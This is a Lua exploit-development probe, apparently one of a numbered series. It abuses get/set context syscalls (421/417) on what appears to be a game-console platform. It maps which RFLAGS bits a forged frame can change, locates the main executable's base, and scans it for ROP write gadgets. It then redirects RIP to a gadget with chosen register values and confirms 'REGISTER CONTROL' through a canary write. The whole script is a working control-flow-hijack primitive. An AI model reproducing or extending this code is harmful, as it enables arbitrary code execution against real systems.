-- CRASH_CLASS: LOW
-- PROBE 816c: does an accepted frame RFLAGS change actually land, and which
--             bits does the cookie leave free?
--
-- 816a proved: baseline record -> 417 ret=0; RFLAGS|IOPL -> 417 ret=-1.
-- 816b's table was built wrong (every row but the first dropped IF, bit 9,
-- which is masked, so the rows tested IF rather than the bit under test).
--
-- This probe keeps IF set in every row and, after each accepted 417, asks 421
-- for the frame again. If the readback carries the changed bit, the install is
-- verbatim apart from the masked bits - which is the whole question: is the
-- primitive broken, or is the mask doing exactly its job?

print("=== PROBE 816c: FRAME RFLAGS READBACK + FREE-BIT MAP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rdb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function q(addr)
    local v = safe_rq(addr)
    if v == nil then return 0 end
    return to_num(v)
end
local function qhex(addr)
    local v = q(addr)
    local lo = v % 4294967296
    local hi = math.floor(v / 4294967296) % 4294967296
    return string.format("%08X%08X", hi, lo)
end
local function setq(addr, val)
    safe_wd(addr, val % 4294967296)
    safe_wd(addr + 4, math.floor(val / 4294967296) % 4294967296)
end

local sc421 = make_syscall(421)
local sc417 = make_syscall(417)

local buf = memory.alloc(0x600)
for off = 0, 0x5FF, 4 do safe_wd(buf + off, 0) end

print(string.format("[0] pid=%d buf=0x%08X", to_num(syscall.getpid()), to_num(buf)))

local ok, r = pcall(function() return sc421(uint64(buf)) end)
print(string.format("[A] 421 ret=%s RIP=%s RFLAGS=%s", tostring(r), qhex(buf + 0xE0), qhex(buf + 0xF0)))

-- ------------------------------------------------------------- free-bit map
-- baseline 0x202 (IF). Every row keeps bit 9 set and changes exactly one
-- non-masked candidate bit.
local rows = {
    {0x000203, "CF  bit 0 "},
    {0x000206, "PF  bit 2 "},
    {0x000212, "AF  bit 4 "},
    {0x000242, "ZF  bit 6 "},
    {0x000282, "SF  bit 7 "},
    {0x000602, "OF  bit 11"},
    {0x001202, "DF  bit 10"},
    {0x010202, "RF  bit 16"},
    -- AC last: with AC=1 any unaligned user access raises #AC, which would
    -- end the run rather than fail a row.
    {0x040202, "AC  bit 18"},
}

print("")
print("[B] one bit per row, IF kept, with a 421 readback after each 417")
print("    row  value    bit       417      readback")

local i = 1
while i <= #rows do
    local want = rows[i][1]
    local label = rows[i][2]
    local ok1 = pcall(function() return sc421(uint64(buf)) end)
    if not ok1 then
        print(string.format("    %2d   %06X   %s  421 failed", i, want, label))
    else
        setq(buf + 0xF0, want)
        local ok2, r2 = pcall(function() return sc417(uint64(buf)) end)
        local res = tostring(r2)
        local rejected = (res == "0xffffffffffffffffffffffff" or res == "-1")
        local back = "n/a"
        if not rejected then
            pcall(function() return sc421(uint64(buf)) end)
            back = qhex(buf + 0xF0)
            -- restore the baseline so the next row starts clean
            setq(buf + 0xF0, 0x202)
            pcall(function() return sc417(uint64(buf)) end)
        end
        print(string.format("    %2d   %06X   %s  %-8s %s", i, want, label,
            rejected and "REJECT" or "accept", back))
    end
    i = i + 1
end

-- ------------------------------------------------------- gadget verification
print("")
print("[C] write-gadget candidates in eboot (base from this run)")
local regions = memory.alloc(0x8000)
for off = 0, 0x7FFF, 4 do safe_wd(regions + off, 0) end
local cnt = memory.alloc(8)
safe_wd(cnt, 0)
local sc674 = make_syscall(674)
pcall(function() return sc674(uint64(regions), uint64(72), uint64(512), uint64(cnt), uint64(0x40000000)) end)
local nreg = safe_rd(cnt) or 0
local ebase = nil
local j = 0
while j < nreg do
    local rr = regions + j * 72
    local prot = safe_rd(rr + 0x18) or 0
    local nm = ""
    local k = 0
    while k < 24 do
        local c = safe_rdb(rr + 0x20 + k)
        if not c or c == 0 then break end
        nm = nm .. string.char(c)
        k = k + 1
    end
    if prot == 5 and nm:find("executable") then ebase = safe_rd(rr) or 0 end
    j = j + 1
end
print(string.format("[C] eboot base=0x%08X", ebase or 0))

local function hexat(addr, n)
    local s = ""
    local k = 0
    while k < n do
        local b = safe_rdb(addr + k)
        if b == nil then s = s .. "??" else s = s .. string.format("%02X", b) end
        k = k + 1
    end
    return s
end

if ebase and ebase > 0 then
    print(string.format("[C] ebase+0x1CED = %s", hexat(ebase + 0x1CED, 8)))
    print(string.format("[C] ebase+0x1C00 = %s", hexat(ebase + 0x1C00, 16)))
end

-- scan a bounded window for the two write gadgets
if ebase and ebase > 0 then
    local found_rdi, found_rdx = nil, nil
    local off = 0
    while off < 0x100000 do
        local ok3, d = pcall(function() return memory.read_dword(ebase + off) end)
        if not ok3 then break end
        local dv = to_num(d)
        if dv == 0xC3078948 and not found_rdi then found_rdi = ebase + off end
        if dv == 0xC3028948 and not found_rdx then found_rdx = ebase + off end
        if found_rdi and found_rdx then break end
        off = off + 4
    end
    print(string.format("[C] mov [rdi],rax;ret=%s  mov [rdx],rax;ret=%s",
        found_rdi and string.format("0x%08X", found_rdi) or "none",
        found_rdx and string.format("0x%08X", found_rdx) or "none"))

    local g = found_rdx or found_rdi
    if g then
        local canary = memory.alloc(0x1000)
        for o2 = 0, 0xFFF, 4 do safe_wd(canary + o2, 0) end
        pcall(function() return sc421(uint64(buf)) end)
        local MARK = 0xDEADBEEFCAFE
        setq(buf + 0x58, to_num(canary))
        setq(buf + 0x48, to_num(canary))
        setq(buf + 0x78, MARK)
        setq(buf + 0xE0, g)
        -- RSP untouched: the gadget's `ret` continues the loader.
        local ok4, r4 = pcall(function() return sc417(uint64(buf)) end)
        print(string.format("[D] 417 ret=%s", tostring(r4)))
        print(string.format("[D] canary=%s (want %016X)", qhex(canary), MARK))
        if q(canary) == MARK then
            print("[D] REGISTER CONTROL CONFIRMED")
        else
            print("[D] canary untouched - RIP/RDX may not have been installed")
        end
    end
end

print("")
print("=== PROBE 816c DONE ===")
